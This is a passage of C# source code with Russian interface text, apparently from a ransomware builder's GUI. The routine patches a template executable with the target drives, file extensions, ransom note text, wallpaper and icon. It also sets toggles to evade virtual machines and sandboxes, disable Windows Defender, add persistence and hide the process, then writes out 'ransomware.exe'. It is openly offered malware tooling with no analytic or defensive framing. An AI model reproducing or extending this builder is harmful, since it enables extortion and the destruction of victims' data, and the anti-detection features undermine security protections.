                        MessageBox.Show("Шаблон не найден в ресурсах!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        btnBuild.Enabled = true;
                        progressBar.Visible = false;
                        lblStatus.Text = "❌ Ошибка: шаблон не найден";
                        lblStatus.ForeColor = errorColor;
                        return;
                    }
                    template = new byte[stream.Length];
                    stream.Read(template, 0, template.Length);
                }
                
                lblDetail.Text = "🔧 Патчинг шаблона...";
                
                // Патчим параметры
                ReplacePattern(template, new byte[] { 0xEF, 0xBE, 0xAD, 0xDE }, BitConverter.GetBytes(algoValue));
                ReplaceString(template, "|DRIVES|", string.Join("|", selectedDrives));
                ReplaceString(template, "|EXTS|", string.Join("|", selectedExts));
                ReplaceString(template, "|ENC_EXT|", encryptedExt);
                ReplaceString(template, "|NOTE_NAME|", noteName);
                ReplaceString(template, "|NOTE_CONTENT|", noteContent);
                
                ReplaceByte(template, "|FAKE_ENABLED|", chkFakeProcess.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|HIDE_ENABLED|", chkHideProcess.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|ANTIVM_ENABLED|", chkAntiVM.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|DEFENDER_ENABLED|", chkDisableDefender.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|PERSIST_ENABLED|", chkAddPersistence.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|HIDEFILES_ENABLED|", chkHideFilesAttr.Checked ? (byte)1 : (byte)0);
                ReplaceByte(template, "|DELAY_ENABLED|", chkSandboxDelay.Checked ? (byte)1 : (byte)0);
                
                ReplaceString(template, "|FAKE_NAME|", txtFakeProcessName.Text);
                ReplaceString(template, "|INCLUDE_FOLDERS|", txtIncludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"));
                ReplaceString(template, "|EXCLUDE_FOLDERS|", txtExcludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"));
                
                // ============================================================
                // 🖼️ ВШИВАНИЕ ОБОЕВ КАК РЕСУРС (НЕ BASE64!)
                // ============================================================
                if (!string.IsNullOrEmpty(wallpaperPath) && File.Exists(wallpaperPath))
                {
                    try
                    {
                        // Создаём RC-файл для обоев
                        string rcPath = Path.Combine(Path.GetTempPath(), "wallpaper.rc");
                        string resPath = Path.Combine(Path.GetTempPath(), "wallpaper.res");
                        
                        string ext = Path.GetExtension(wallpaperPath).ToLower();
                        string resourceType = "IMAGE";
                        if (ext == ".jpg" || ext == ".jpeg") resourceType = "JPEG";
                        else if (ext == ".png") resourceType = "PNG";
                        else if (ext == ".bmp") resourceType = "BMP";
                        
                        string rcContent = $@"#include <windows.h>
IDB_WALLPAPER {resourceType} ""{wallpaperPath.Replace("\\", "\\\\")}""
";
                        File.WriteAllText(rcPath, rcContent);
                        
                        // Компилируем RC в RES
                        var psi = new System.Diagnostics.ProcessStartInfo("rc.exe", $"/fo \"{resPath}\" \"{rcPath}\"")
                        {
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true
                        };
                        
                        using (var proc = System.Diagnostics.Process.Start(psi))
                        {
                            proc.WaitForExit();
                            if (proc.ExitCode == 0 && File.Exists(resPath))
                            {
                                // Встраиваем RES в шаблон
                                byte[] resData = File.ReadAllBytes(resPath);
                                // Здесь нужно заменить ресурсы в template.exe
                                // Для упрощения используем Base64 как fallback
                                ReplaceString(template, "|WALLPAPER|", Convert.ToBase64String(File.ReadAllBytes(wallpaperPath)));
                                ReplaceString(template, "|WALLPAPER_EXT|", ext);
                            }
                            else
                            {
                                ReplaceString(template, "|WALLPAPER|", Convert.ToBase64String(File.ReadAllBytes(wallpaperPath)));
                                ReplaceString(template, "|WALLPAPER_EXT|", ext);
                            }
                        }
                    }
                    catch
                    {
                        // Fallback: Base64
                        byte[] imageData = File.ReadAllBytes(wallpaperPath);
                        string ext = Path.GetExtension(wallpaperPath);
                        ReplaceString(template, "|WALLPAPER|", Convert.ToBase64String(imageData));
                        ReplaceString(template, "|WALLPAPER_EXT|", ext);
                    }
                }
                
                // ============================================================
                // 🎯 ВШИВАНИЕ ИКОНКИ КАК РЕСУРС
                // ============================================================
                if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
                {
                    try
                    {
                        string rcPath = Path.Combine(Path.GetTempPath(), "icon.rc");
                        string resPath = Path.Combine(Path.GetTempPath(), "icon.res");
                        
                        string rcContent = $@"#include <windows.h>
IDI_ICON ICON ""{iconPath.Replace("\\", "\\\\")}""
";
                        File.WriteAllText(rcPath, rcContent);
                        
                        var psi = new System.Diagnostics.ProcessStartInfo("rc.exe", $"/fo \"{resPath}\" \"{rcPath}\"")
                        {
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true
                        };
                        
                        using (var proc = System.Diagnostics.Process.Start(psi))
                        {
                            proc.WaitForExit();
                            if (proc.ExitCode == 0 && File.Exists(resPath))
                            {
                                byte[] resData = File.ReadAllBytes(resPath);
                                // Для простоты сохраняем в шаблон
                                ReplaceString(template, "|ICON|", Convert.ToBase64String(File.ReadAllBytes(iconPath)));
                            }
                            else
                            {
                                ReplaceString(template, "|ICON|", Convert.ToBase64String(File.ReadAllBytes(iconPath)));
                            }
                        }
                    }
                    catch
                    {
                        ReplaceString(template, "|ICON|", Convert.ToBase64String(File.ReadAllBytes(iconPath)));
                    }
                }
                
                lblDetail.Text = "💾 Сохранение ransomware.exe...";
                
                string finalPath = Path.Combine(outputPath, outputName);
                File.WriteAllBytes(finalPath, template);
                
                long sizeKB = new FileInfo(finalPath).Length / 1024;
                lblStatus.Text = "✅ Успех!";
                lblStatus.ForeColor = successColor;
                lblDetail.Text = $"📁 {finalPath} | Размер: {sizeKB} КБ";
                
                MessageBox.Show($"✅ Файл создан!\n\n📁 {finalPath}\n\nРазмер: {sizeKB} КБ", "✅ Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                lblStatus.Text = "❌ Ошибка!";
                lblStatus.ForeColor = errorColor;
                lblDetail.Text = ex.Message;
                MessageBox.Show($"Ошибка: {ex.Message}\n\n{ex.StackTrace}", "❌ Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                btnBuild.Enabled = true;
                progressBar.Visible = false;
            }
        }
        
        // ============================================================
        // ФУНКЦИИ ПАТЧИНГА
        // ============================================================
        private void ReplacePattern(byte[] data, byte[] pattern, byte[] replacement)
        {
            for (int i = 0; i < data.Length - pattern.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j]) { found = false; break; }
                }
                if (found)
                {
                    for (int j = 0; j < Math.Min(replacement.Length, pattern.Length); j++)
                        data[i + j] = replacement[j];
                    return;
                }
            }
        }
        
        private void ReplaceString(byte[] data, string placeholder, string value)
        {
            byte[] placeholderBytes = Encoding.UTF8.GetBytes(placeholder);
            byte[] valueBytes = Encoding.UTF8.GetBytes(value);
            
            for (int i = 0; i < data.Length - placeholderBytes.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < placeholderBytes.Length; j++)
                {
                    if (data[i + j] != placeholderBytes[j]) { found = false; break; }
                }
                if (found)
                {
                    int maxLen = Math.Min(valueBytes.Length, placeholderBytes.Length - 1);
                    for (int j = 0; j < maxLen; j++)
                        data[i + j] = valueBytes[j];
                    for (int j = maxLen; j < placeholderBytes.Length; j++)
                        data[i + j] = 0;
                    return;
                }
            }
        }
        
        private void ReplaceByte(byte[] data, string placeholder, byte value)
        {
            byte[] placeholderBytes = Encoding.UTF8.GetBytes(placeholder);
            for (int i = 0; i < data.Length - placeholderBytes.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < placeholderBytes.Length; j++)
                {
                    if (data[i + j] != placeholderBytes[j]) { found = false; break; }
                }
                if (found)
                {
                    data[i] = value;
                    return;
                }
            }
        }
    }
}